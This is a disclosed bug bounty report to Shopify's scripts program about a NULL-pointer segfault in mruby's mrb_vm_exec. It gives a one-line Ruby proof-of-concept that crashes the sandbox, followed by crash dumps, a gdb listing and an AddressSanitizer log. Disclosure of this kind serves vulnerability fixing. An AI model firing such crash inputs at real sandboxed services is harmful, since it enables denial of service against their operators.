# SIGSEGV in mrb_vm_exec

## Report Details
- **Report ID**: 196380
- **URL**: https://hackerone.com/reports/196380
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-06T19:57:37.489Z
- **Disclosed**: 2017-03-01T21:24:49.421Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC:
-------------------

The following code triggers the bug (attached as test_mrb_vm_exec_1296.rb):
	
	0.instance_eval{super()}

Sandbox:
-------------------

	x@x:~/Desktop/research/mruby-engine/bin$ ./sandbox test_mrb_vm_exec_1296.rb 
	./sandbox:20: [BUG] Segmentation fault at 0x00000000000028
	ruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
	c:0002 p:0186 s:0005 E:001a28 EVAL   ./sandbox:20 [FINISH]
	c:0001 p:0000 s:0002 E:000ff0 TOP    [FINISH]

	-- Ruby level backtrace information ----------------------------------------
	./sandbox:20:in `<main>'
	./sandbox:20:in `sandbox_eval'

	-- Machine register context ------------------------------------------------
	 RIP: 0x00007f6775adcd27 RBP: 0x00007f67746c9a74 RSP: 0x00007f67746629e0
	 RAX: 0x0000000000000000 RBX: 0x0000000000000000 RCX: 0x0000000000000001
	 RDX: 0x000000000000004f RDI: 0x00007f67746644e0 RSI: 0x00007f6774662cb0
	  R8: 0x00007f67746643e0  R9: 0x0000000000000000 R10: 0x00007f67746644e0
	 R11: 0x0000000000000000 R12: 0x000000000000004f R13: 0x0000000000000000
	 R14: 0x00007f6774676f80 R15: 0x00007f67746644e0 EFL: 0x0000000000010202

	-- C level backtrace information -------------------------------------------
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f677a1dfd55]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f677a1dff8c]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f677a0bc06b]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f677a17214e]
	/lib/x86_64-linux-gnu/libc.so.6 [0x7f6779cbcff0]
	/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x1f37) [0x7f6775adcd27] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1296
	/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x5c) [0x7f6775ae184c] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772
	/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0xbe) [0x7f6775acf41e] ../../../../ext/mruby_engine/eval_monitored.c:68
	/lib/x86_64-linux-gnu/libpthread.so.0(start_thread+0xc2) [0x7f6779a70182] pthread_create.c:312
	/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f6779d8130d] ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
	...
	...
	...
	7f677a6ee000-7f677a6ef000 rw-p 00000000 00:00 0 
	7fff151a6000-7fff159a5000 rw-p 00000000 00:00 0                          [stack]
	7fff159fe000-7fff15a00000 r-xp 00000000 00:00 0                          [vdso]
	ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


	[NOTE]
	You may have encountered a bug in the Ruby interpreter or extension libraries.
	Bug reports are welcome.
	For details: http://www.ruby-lang.org/bugreport.html

	Aborted (core dumped)

Debug:
-------------------

	(gdb) r sandbox test_mrb_vm_exec_1296.rb 
	Starting program: /usr/bin/ruby sandbox test_mrb_vm_exec_1296.rb
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	[New Thread 0x7ffff7ff7700 (LWP 2975)]
	[New Thread 0x7ffff1f73700 (LWP 3022)]

	Program received signal SIGSEGV, Segmentation fault.
	[Switching to Thread 0x7ffff1f73700 (LWP 3022)]
	0x00007ffff33ecd27 in mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=<optimized out>, proc@entry=0x7ffff1f7c130, pc=0x7ffff1fd9a74) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1296
	1296	      c = mrb->c->ci->target_class->super;
	(gdb) l
	1291	        exc = mrb_exc_new_str_lit(mrb, E_NOMETHOD_ERROR, "super called outside of method");
	1292	        mrb_exc_set(mrb, exc);
	1293	        goto L_RAISE;
	1294	      }
	1295	      recv = regs[0];
	1296	      c = mrb->c->ci->target_class->super;
	1297	      m = mrb_method_search_vm(mrb, &c, mid);
	1298	      if (!m) {
	1299	        mrb_sym missing = mrb_intern_lit(mrb, "method_missing");
	1300	        m = mrb_method_search_vm(mrb, &c, missing);

Backtrace:
-------------------

	(gdb) bt
	#0  0x00007ffff33ecd27 in mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=<optimized out>, proc@entry=0x7ffff1f7c130, pc=0x7ffff1fd9a74) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1296
	#1  0x00007ffff33f184c in mrb_vm_run (mrb=0x7ffff1f744e0, proc=0x7ffff1f7c130, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772
	#2  0x00007ffff33df41e in mruby_engine_monitored_eval (data=0x7ffff1f743e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
	#3  0x00007ffff7380182 in start_thread (arg=0x7ffff1f73700) at pthread_create.c:312
	#4  0x00007ffff769130d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111

Clang - ASAN - Log:
-------------------

	x@x:~/Desktop/research/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer ./mirb test_mrb_vm_exec_1299.rb 
	mirb - Embeddable Interactive Ruby Shell

	ASAN:DEADLYSIGNAL
	=================================================================
	==2791==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000028 (pc 0x00000050dc52 bp 0x7fff39f50030 sp 0x7fff39f48b00 T0)
	    #0 0x50dc51 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1296:37
	    #1 0x501d5b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10
	    #2 0x4f3ef8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
	    #3 0x7fd62e3a4ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
	    #4 0x41a595 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/clang/mruby/src/vm.c:1296:37 in mrb_vm_exec
	==2791==ABORTING


## Attachments
- test_mrb_vm_exec_1296.rb
- sandbox.log
